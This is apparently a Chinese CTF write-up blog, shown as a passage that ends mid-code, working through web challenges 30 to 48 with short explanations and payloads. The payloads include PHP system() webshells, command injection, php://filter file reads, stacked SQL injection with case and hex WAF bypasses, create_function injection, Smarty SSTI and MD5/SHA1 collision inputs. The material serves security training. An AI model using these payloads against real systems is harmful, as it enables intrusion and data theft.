<h1 id="30-鹤城杯-2021-EasyP"><a href="#30-鹤城杯-2021-EasyP" class="headerlink" title="30.[鹤城杯 2021]EasyP"></a>30.[鹤城杯 2021]EasyP</h1><p><code>$_SERVE[&#39;PHP_SELF&#39;]</code>的特性，根目录存在index.php，访问<code>http://localhost/</code>自动进入index.php，但地址栏不显示，但通过<code>$_SERVE[&#39;PHP_SELF&#39;]</code>可以获取index.php这个文件名，其实是获取一条路径，&#x2F;index.php</p>
<p>如果当前服务器路径是<code>/test/test1/index.php</code>那么<code>$_SERVE[&#39;PHP_SELF&#39;]</code>就会是<code>/test/test1/index.php</code></p>
<p><code>basename()</code>函数就是获取最后一个&#x2F;后面的东西</p>
<p>show_source可用show[source或show.source绕过</p>
<p><code>preg_match(&#39;/utils\.php\*$/i&#39;)</code>使用一个乱码的编码绕过，如%88</p>
<p>payload：<code>?/index.php/utils.php/%88?show.source=1</code></p>
<h1 id="31-LitCTF-2023-PHP是世界上最好的语言！！"><a href="#31-LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="31.[LitCTF 2023]PHP是世界上最好的语言！！"></a>31.[LitCTF 2023]PHP是世界上最好的语言！！</h1><p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="32-SWPUCTF-2021-新生赛-finalrce"><a href="#32-SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="32.[SWPUCTF 2021 新生赛]finalrce"></a>32.[SWPUCTF 2021 新生赛]finalrce</h1><p>payload1：<code>l\s /|tee 1.txt</code>然后访问1.txtx</p>
<p>payload2：<code>tac /flllll\aaaaaaggggggg|tee 1.txt</code></p>
<h1 id="33-NISACTF-2022-checkin"><a href="#33-NISACTF-2022-checkin" class="headerlink" title="33.[NISACTF 2022]checkin"></a>33.[NISACTF 2022]checkin</h1><p>选中N1SACTF会同时选中后面那部分，粘贴到url，并进行urlencode，cuishiyuan那部分也是一样</p>
<p>payload：<code>ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag!%E2%81%A9%E2%81%A6N1SACTF</code></p>
<h1 id="34-LitCTF-2023-1zjs"><a href="#34-LitCTF-2023-1zjs" class="headerlink" title="34.[LitCTF 2023]1zjs"></a>34.[LitCTF 2023]1zjs</h1><p>F12有个<code>.dist/index.mud.js</code>，访问，F12注释有<code> /f@k3f1ag.php</code>，访问，jsfuck直接在控制台输出flag</p>
<h1 id="35-鹏城杯-2022-简单包含"><a href="#35-鹏城杯-2022-简单包含" class="headerlink" title="35.[鹏城杯 2022]简单包含"></a>35.[鹏城杯 2022]简单包含</h1><p>脏数据绕过waf，提交大量参数</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="36-LitCTF-2023-Ping"><a href="#36-LitCTF-2023-Ping" class="headerlink" title="36.[LitCTF 2023]Ping"></a>36.[LitCTF 2023]Ping</h1><p>用POST传参，不要在前端传参</p>
<p>payload：<code>command=0.0.0.0;cat /flag&amp;ping=Ping</code></p>
<h1 id="37-LitCTF-2023-Follow-me-and-hack-me"><a href="#37-LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="37.[LitCTF 2023]Follow me and hack me"></a>37.[LitCTF 2023]Follow me and hack me</h1><p>payload：<code>?CTF=Lit2023 POST:Challenge=i&#39;m_c0m1ng</code></p>
<h1 id="38-SWPUCTF-2022-新生赛-ez-ez-php"><a href="#38-SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="38.[SWPUCTF 2022 新生赛]ez_ez_php"></a>38.[SWPUCTF 2022 新生赛]ez_ez_php</h1><p>payload：<code>/?file=php://filter/read=convert.base64-encode/resource=flag</code></p>
<h1 id="39-LitCTF-2023-作业管理系统"><a href="#39-LitCTF-2023-作业管理系统" class="headerlink" title="39.[LitCTF 2023]作业管理系统"></a>39.[LitCTF 2023]作业管理系统</h1><p>F12获取口令进入后台，新建flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;flag.php</p>
<h1 id="40-强网杯-2019-随便注"><a href="#40-强网杯-2019-随便注" class="headerlink" title="40.[强网杯 2019]随便注"></a>40.[强网杯 2019]随便注</h1><p>前置知识：</p>
<p><strong>show</strong>：</p>
<p>show databases;&#x2F;&#x2F;查数据库</p>
<p>show tables;&#x2F;&#x2F;查表名</p>
<p>show columns from table;&#x2F;&#x2F;查字段</p>
<p><strong>alter</strong>：</p>
<p>修改已知表的列（增加add、更改alter、change、撤销drop)</p>
<p>添加列</p>
<p><code>alter table &quot;table_name&quot; add &quot;column_name&quot; type;</code></p>
<p>删除列</p>
<p><code>alter table &quot;table_name&quot; drop &quot;column_name&quot; type;</code></p>
<p>改变列数据类型</p>
<p><code>alter talbe &quot;table_name&quot; alter column &quot;column_name&quot; type;</code></p>
<p>改列名</p>
<p><code>alter table &quot;table_name&quot; change &quot;column1&quot; &quot;column2&quot; type;</code></p>
<p><code>alter talbe &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;</code></p>
<p><strong>SQL约束</strong>：</p>
<p>not-null指示某列不能存储NULL值</p>
<p><code>alter table persons modify age int not null;</code>设置not null约束</p>
<p><code>alter table person modify age int null;</code>取消null约束</p>
<p>primary key 指定主键，确保某列有唯一标识，每个表有且只有一个主键</p>
<p><code>alter table persons add age primary key (id)</code></p>
<p>unique 保证某列每行必须有唯一的值（可以有多个unique约束，只能有一个primary key约束）</p>
<p><code>alter table person add unique (id);</code></p>
<p>check 限制列中值的范围</p>
<p><code>alter table person add check (id&gt;0);</code></p>
<p>deafult 规定没有给列赋值时的默认值</p>
<p><code>alter table person alter city set default &#39;chengdu&#39;;//mysql</code></p>
<p><code>alter table person add constraint ab_c default &#39;chengdu&#39; for city;//SQL server / MS access</code></p>
<p>auto_increment 自动赋值</p>
<p>foreign key保证一个表中的数据匹配另一个表中值的参照完整性</p>
<p>payload1：</p>
<p><code>1&#39;;show tables;#</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;1919810931114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;words&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>1&#39;;show columns from `1919810931114514`;#</code></p>
<p>其中存在flag</p>
<p>过滤了select，可以使用16进制编码查询语句，select * from <code>1919810931114514</code>，结果为<code>0x73656c656374202a2066726f6d20603139313938313039333131313435313460</code></p>
<p>使用prepare from预处理语句，将会在执行时进行编码转换，execute用来执行，select可以在一条语句为多个变量赋值，set只能对一个变量赋值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="variable">@var1</span><span class="operator">=</span><span class="string">&#x27;y&#x27;</span>,<span class="variable">@var2</span><span class="operator">=</span><span class="string">&#x27;n&#x27;</span>#即可</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@var1</span><span class="operator">=</span><span class="string">&#x27;y&#x27;</span></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@var2</span><span class="operator">=</span><span class="string">&#x27;n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>set会触发waf：<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code>，使用大小写绕过</p>
<p>最终payload：</p>
<p><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code></p>
<p>解法2：rename将wors改为其他表名，将1919…表名改为wors，给words表添加新的列名id，将flag改名data</p>
<p>payload：</p>
<p><code>1&#39;;rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigend not Null auto_increment primary key;alter table words change flag data varcahr(100);# </code></p>
<p>解法3：使用handler</p>
<p>payload：</p>
<p><code>1&#39;;handler `1919810931114514` open as `a`; handler `a` read next;#</code></p>
<h1 id="41-UUCTF-2022-新生赛-websign"><a href="#41-UUCTF-2022-新生赛-websign" class="headerlink" title="41.[UUCTF 2022 新生赛]websign"></a>41.[UUCTF 2022 新生赛]websign</h1><p>禁用了F12、Ctrl+U、右键，直接抓包</p>
<h1 id="42-NISACTF-2022-level-up"><a href="#42-NISACTF-2022-level-up" class="headerlink" title="42.[NISACTF 2022]level-up"></a>42.[NISACTF 2022]level-up</h1><p>&#x2F;robots.txt-&gt; level_2_1s_h3re.php</p>
<p>md5强碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p>hackbar无法传参会报错url malformed，需要使用bp -&gt;Level___3.php</p>
<p>sha1，同时也是payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>

<p>-&gt;level_level4.php</p>
<p>_被过滤可以用+或者[替代，payload：<code>?NI+SA+=txw4ever</code>-&gt;55_5_55.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>create_function注入，payload：<code>a=\create_function&amp;b=&#125;system(&#39;cat /flag&#39;);//</code></p>
<h1 id="43-HUBUCTF-2022-新生赛-checkin"><a href="#43-HUBUCTF-2022-新生赛-checkin" class="headerlink" title="43.[HUBUCTF 2022 新生赛]checkin"></a>43.[HUBUCTF 2022 新生赛]checkin</h1><p>弱比较，php array的形式还有序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//payload：?info=a:2:&#123;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="44-CISCN-2019华东南-Web11"><a href="#44-CISCN-2019华东南-Web11" class="headerlink" title="44.[CISCN 2019华东南]Web11"></a>44.[CISCN 2019华东南]Web11</h1><p>smarty ssti</p>
<p>xff处payload：<code>&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code>然后F12查看flag</p>
<h1 id="45-HDCTF-2023-Welcome-To-HDCTF-2023"><a href="#45-HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="45.[HDCTF 2023]Welcome To HDCTF 2023"></a>45.[HDCTF 2023]Welcome To HDCTF 2023</h1><p>F12看到jsfuck直接复制控制台输出</p>
<h1 id="46-NISACTF-2022-babyupload"><a href="#46-NISACTF-2022-babyupload" class="headerlink" title="46.[NISACTF 2022]babyupload"></a>46.[NISACTF 2022]babyupload</h1><p>&#x2F;source下载源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br></pre></td></tr></table></figure>

<p>上传文件时会将uid和文件名添加到数据库中，并重定向到该文件下，过滤了文件名带.的文件，只需要上传文件名为<code>/flag</code>的文件，抓包改文件名即可</p>
<h1 id="47-GDOUCTF-2023-hate-eat-snake"><a href="#47-GDOUCTF-2023-hate-eat-snake" class="headerlink" title="47.[GDOUCTF 2023]hate eat snake"></a>47.[GDOUCTF 2023]hate eat snake</h1><p>F12把snake.js里的971行修改成<code>if(this[&#39;getScore&#39;]() &gt; 1)</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="string">&#x27;getScore&#x27;</span>]() &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">alert</span>(<span class="title function_">_0x324fcb</span>(<span class="number">0x2d9</span>, <span class="number">0x2c3</span>, <span class="number">0x2db</span>, <span class="number">0x2f3</span>) + <span class="string">&#x27;k3r_h0pe_t&#x27;</span> + <span class="title function_">_0xe4a674</span>(<span class="number">0x5a1</span>, <span class="number">0x595</span>, <span class="number">0x59e</span>, <span class="number">0x57c</span>) + <span class="string">&#x27;irlfriend&#125;&#x27;</span>),</span><br></pre></td></tr></table></figure>

<p>然后开始游戏就弹flag</p>
<h1 id="48-NISACTF-2022-babyserialize"><a href="#48-NISACTF-2022-babyserialize" class="headerlink" title="48.[NISACTF 2022]babyserialize"></a>48.[NISACTF 2022]babyserialize</h1><p>php的魔术方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</span><br><span class="line">__construct():具有构造函数的类在创建新对象的时候，回调此方法</span><br><span class="line">__destruct():反序列化的时候，或者对象销毁的时候调用</span><br><span class="line">__wakeup():反序列化的时候调用</span><br><span class="line">__sleep():序列化的时候调用</span><br><span class="line">__toString():把类当成字符串的时候调用，一般在echo处生效</span><br><span class="line">__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line">__get():读取不可访问或者不存在的属性的时候，进行赋值</span><br><span class="line">__call():在对象中调用一个不可访问的方法的时候，会被执行</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span 